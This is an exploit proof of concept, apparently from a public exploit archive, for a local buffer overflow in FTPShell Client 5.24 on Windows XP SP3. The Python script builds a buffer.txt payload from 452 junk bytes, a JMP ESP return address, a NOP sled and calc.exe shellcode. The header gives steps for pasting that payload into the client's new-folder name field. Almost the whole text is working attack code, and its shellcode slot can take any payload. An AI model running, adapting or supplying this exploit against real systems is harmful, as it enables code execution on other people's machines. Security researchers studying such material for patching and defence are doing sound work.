#[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]
#[+] Exploit Title: FTPShell Client (Add New Folder) Local Buffer Overflow
#[+] Date: 2/2/2016
#[+]Exploit Author: Arash Khazaei
#[+] Vendor Homepage: www.ftpshell.com
#[+]Software Link: http://www.ftpshell.com/download.htm
#[+] Version: 5.24
#[+] Tested on: Windows XP Professional SP3 (Version 2002)
#[+] CVE : N/A
#[+] introduction : Add New Folder In Remote FTP Server And In Name Input Copy Buffer.txt File content 
#[+] or click on Remote Tab Then Click On Create Folder And Copy Buffer.txt In Name Input ...
#[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]

#!/usr/bin/python
filename = "buffer.txt"
# Junk A
junk = "A"*452
#77FAB277  JMP ESP
# Windows Xp Professional Version 2002 Service Pack 3
eip = "\x77\xB2\xFA\x77"
# Nops
nops = "\x90"*100
# Shellcode Calc.exe 16Byte
buf=("\x31\xC9"
"\x51"    
"\x68\x63\x61\x6C\x63"    
"\x54"    
"\xB8\xC7\x93\xC2\x77"    
"\xFF\xD0")

#Appending Buffers Together
exploit = junk + eip + nops + buf
#Creating File
length = len(exploit)
print "[+]File name:     [%s]\n" % filename
print "[+]Payload Size: [%s]\n " % length 
print "[+]File Created.\n" 
file = open(filename,"w")
file.write(exploit)
file.close
print exploit


#[+] Very Special Tnx To My Best Friends: TheNonexistent,Nirex,Pr0t3ctor
